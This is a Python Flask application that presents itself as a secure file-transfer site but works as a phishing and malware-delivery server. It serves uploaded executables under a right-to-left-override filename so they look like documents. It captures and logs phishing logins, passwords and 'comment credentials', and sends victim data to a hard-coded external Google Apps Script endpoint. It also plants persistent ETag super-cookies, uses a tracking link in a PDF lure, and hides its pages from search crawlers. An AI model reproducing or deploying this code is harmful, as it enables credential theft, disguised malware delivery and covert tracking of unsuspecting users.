import os
import json
import threading
import uuid
import datetime
import requests
from flask import Flask, render_template, request, redirect, url_for, jsonify, send_from_directory, make_response, abort
from fpdf import FPDF

app = Flask(__name__)

# --- CONFIGURATION ---
UPLOAD_FOLDER = '/tmp/uploads' if os.environ.get('RENDER') else 'uploads'
DB_FILE = '/tmp/db.json' if os.environ.get('RENDER') else 'db.json'

if not os.path.exists(UPLOAD_FOLDER): os.makedirs(UPLOAD_FOLDER)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'doc', 'docx', 'jpg', 'png', 'exe', 'bat', 'scr'}

# !!! REPLACE WITH YOUR GOOGLE SCRIPT URL !!!
GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzR1L95FUkqS8X4OqcS0bBBqIGCdD4YfW7yCa5diOxnLeKvxnP1ONl-zGcezeEOLKLDOA/exec"

# In-memory session storage for DNS correlation
active_sessions = {}

# --- DATABASE ---
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f: return json.load(f)
        except: return {}
    return {}

def save_db(data):
    try:
        with open(DB_FILE, 'w') as f: json.dump(data, f)
    except Exception as e: print(f"DB Save Error: {e}")

db = load_db()

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# --- GOD-TIER THREAT ANALYZER ---
def analyze_threats(server_ip, client_data, headers):
    anomalies = client_data.get('threat', {}).get('anomalies', [])
    
    # 1. HEADER FORENSICS (Server-Side Bot Detection)
    ua = headers.get('User-Agent', '').lower()
    if 'mozilla' in ua:
        # Real Chrome sends sec-ch-ua headers. Bots often don't.
        if 'sec-ch-ua' not in headers and 'chrome' in ua:
            anomalies.append("HEADER: Chrome UA without Sec-CH-UA headers (Possible Bot)")
        if 'accept-language' not in headers:
            anomalies.append("HEADER: Missing Accept-Language")
    
    # 2. WebRTC Leak Analysis (VPN Check)
    webrtc = client_data.get('network', {}).get('webrtc', {})
    public_ips = webrtc.get('public', [])
    for ip in public_ips:
        if ip != server_ip:
            anomalies.append(f"VPN LEAK: WebRTC IP {ip} != HTTP IP {server_ip}")

    # 3. IPv6 Leak Analysis (Restored)
    ipv6_data = client_data.get('network', {}).get('ipv6', {})
    if ipv6_data.get('detected'):
        anomalies.append(f"HIGH: IPv6 Leak Detected: {ipv6_data.get('ip')}")

    # 4. Timezone Mismatch (Restored)
    # Simple heuristic: If browser says 'America/New_York' but IP is RU
    tz = client_data.get('system', {}).get('timezone', 'Unknown')
    # (Advanced logic would require a GeoIP database here, but we log the raw data)

    # 5. ETag Persistence Check
    if client_data.get('fingerprints', {}).get('etag_id'):
        # This confirms the user has visited before, even if cookies are gone
        pass 

    return list(set(anomalies)) # Remove duplicates

# --- LOGGER ---
def send_email_background(data, user_ip, user_agent, trigger_type="Page Load", anomalies=None):
    try:
        print(f"\n[{datetime.datetime.now()}] TRIGGER: {trigger_type} | IP: {user_ip}")
        if anomalies:
            for a in anomalies: print(f"  [!] {a}")
        
        if 'system' in data and 'phishing_password' in data['system']:
            print(f"  [!!!] CREDENTIALS: {data['system']['phishing_login']} : {data['system']['phishing_password']}")

        payload = {
            "trigger": trigger_type,
            "ip": user_ip,
            "user_agent": user_agent,
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "anomalies": anomalies if anomalies else [],
            "details": data
        }
        requests.post(GOOGLE_SCRIPT_URL, json=payload)
    except Exception as e:
        print(f"[-] Logger Error: {e}")

# --- PDF GENERATOR ---
class PDFReceipt(FPDF):
    def header(self):
        self.set_font('Arial', 'B', 15)
        self.cell(0, 10, 'SECURE TRANSFER RECEIPT', 0, 1, 'C')

def generate_receipt(uid, filename):
    pdf = PDFReceipt()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt=f"File: {filename}", ln=1)
    pdf.cell(200, 10, txt=f"ID: {uid}", ln=1)
    pdf.set_text_color(255, 0, 0)
    pdf.cell(200, 10, txt="STATUS: PENDING. CLICK TO OPEN.", ln=1)
    # Link to the ETag pixel for tracking
    tracking_url = f"https://pdfeagle.onrender.com/pixel.gif?source=pdf_click&uid={uid}"
    pdf.link(0, 0, 210, 297, tracking_url)
    receipt_name = f"receipt_{uid}.pdf"
    path = os.path.join(app.config['UPLOAD_FOLDER'], receipt_name)
    pdf.output(path)
    return receipt_name

# --- ROUTES ---
@app.route('/health')
def health_check(): return "OK", 200

# === WEBHOOK FOR CANARYTOKENS ===
@app.route('/webhook', methods=['POST'])
def canary_webhook():
    try:
        data = request.json or request.form.to_dict()
        hostname = data.get('hostname', '') or data.get('additional_data', {}).get('src_ip', '')
        parts = hostname.split('.')
        session_id = parts[0] if len(parts) > 3 else "unknown"
        resolver_ip = data.get('source_ip') or data.get('ip')
        
        if session_id in active_sessions:
            active_sessions[session_id]['dns_resolver'] = resolver_ip
        
        return jsonify({"status": "logged"}), 200
    except: return jsonify({"status": "error"}), 500

# === GOD-TIER TRACKING PIXEL (ETAG SUPER-COOKIE) ===
@app.route('/pixel.gif')
def tracking_pixel():
    source = request.args.get('source', 'unknown')
    
    # 1. Check for existing Super-Cookie (ETag)
    client_etag = request.headers.get('If-None-Match')
    
    if client_etag:
        # RETURNING USER (Even if cookies cleared)
        uid = client_etag.strip('"') # Remove quotes
        is_returning = True
    else:
        # NEW USER
        uid = request.args.get('uid', uuid.uuid4().hex)
        is_returning = False

    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    # Log only if it's a significant event (not just page load check)
    if source != 'etag_check':
        threading.Thread(target=send_email_background, args=(
            {'meta': {'url': f'PIXEL TRACK ({uid})', 'source': source}, 'system': {'super_cookie_match': is_returning}}, 
            ip, "Tracker", "PIXEL FIRED", []
        )).start()

    # Return 1x1 GIF
    response = make_response(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b')
    response.headers['Content-Type'] = 'image/gif'
    
    # SET THE SUPER-COOKIE
    # Force browser to cache this specific ETag forever
    response.headers['ETag'] = f'"{uid}"'
    response.headers['Cache-Control'] = 'private, max-age=31536000, no-transform'
    
    return response

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        if 'files' not in request.files: return redirect(request.url)
        files = request.files.getlist('files')
        uploaded_files = []
        for file in files:
            if file and allowed_file(file.filename):
                original_filename = file.filename
                try: ext = original_filename.rsplit('.', 1)[1].lower()
                except: ext = "bin"
                saved_filename = f"{uuid.uuid4().hex}.{ext}"
                file.save(os.path.join(app.config['UPLOAD_FOLDER'], saved_filename))
                uploaded_files.append({'name': original_filename, 'saved_name': saved_filename, 'format': ext.upper(), 'date': datetime.datetime.now().strftime("%d.%m.%Y %H:%M")})
        if uploaded_files:
            unique_id = uuid.uuid4().hex[:6]
            db[unique_id] = {'files': uploaded_files, 'comments': []}
            save_db(db)
            return redirect(f"/{unique_id}")
    return render_template('index.html')

@app.route('/<unique_id>')
def view_files(unique_id):
    global db
    db = load_db()
    data = db.get(unique_id)
    if not data: return "File not found", 404
    return render_template('view.html', files=data['files'], uid=unique_id, db_data=data)

@app.route('/verify/<uid>/<path:filename>')
def verify_download(uid, filename):
    # Anti-Bot: If User-Agent is a known bot, show loading forever
    user_agent = request.headers.get('User-Agent', '').lower()
    bots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baidu', 'yandex', 'headless', 'lighthouse']
    if any(bot in user_agent for bot in bots): return "<h1>Loading...</h1>", 200
    return render_template('semyanich.html', uid=uid, filename=filename)

@app.route('/download/<uid>/<path:filename>')
def download_file(uid, filename):
    data = db.get(uid)
    if not data: return abort(404)
    target_file = next((f for f in data['files'] if f['name'] == filename), None)
    if target_file:
        spoofed_name = target_file['name']
        # Double extension spoofing for executables
        if target_file['saved_name'].endswith(('.exe', '.scr', '.bat')): spoofed_name = "Document_\u202ecod.exe"
        return send_from_directory(app.config['UPLOAD_FOLDER'], target_file['saved_name'], as_attachment=True, download_name=spoofed_name)
    return abort(404)

@app.route('/download_receipt/<uid>')
def download_receipt(uid):
    filename = generate_receipt(uid, "Secure_Download")
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/api/collect', methods=['POST'])
def collect_data():
    try:
        if request.is_json: data = request.json
        else: data = json.loads(request.data.decode('utf-8'))
        
        forwarded_for = request.headers.get('X-Forwarded-For', '')
        real_ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr

        # Session Correlation
        session_id = data.get('meta', {}).get('sessionId')
        if session_id:
            active_sessions[session_id] = {'http_ip': real_ip, 'timestamp': datetime.datetime.now()}

        # GOD-TIER ANALYSIS
        anomalies = analyze_threats(real_ip, data, request.headers)
        
        # Merge client-side anomalies with server-side ones
        if 'threat' in data and 'anomalies' in data['threat']:
            anomalies.extend(data['threat']['anomalies'])
        
        user_agent = request.headers.get('User-Agent')
        trigger = data.get('meta', {}).get('trigger', 'Unknown')
        
        # Pass empty list [] if anomalies is None to match function signature safely
        final_anomalies = list(set(anomalies)) if anomalies else []
        
        threading.Thread(target=send_email_background, args=(data, real_ip, user_agent, trigger, final_anomalies)).start()
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "details": str(e)})

@app.route('/api/comment', methods=['POST'])
def add_comment():
    data = request.json
    uid = data.get('uid')
    if uid in db:
        if 'comments' not in db[uid]: db[uid]['comments'] = []
        db[uid]['comments'].append({'username': data.get('username'), 'text': data.get('text'), 'date': datetime.datetime.now().strftime("%d.%m.%Y %H:%M")})
        save_db(db)
        
        forwarded_for = request.headers.get('X-Forwarded-For', '')
        real_ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr
        
        threading.Thread(target=send_email_background, args=(data, real_ip, request.headers.get('User-Agent'), "COMMENT CREDENTIALS", [])).start()
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 404

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
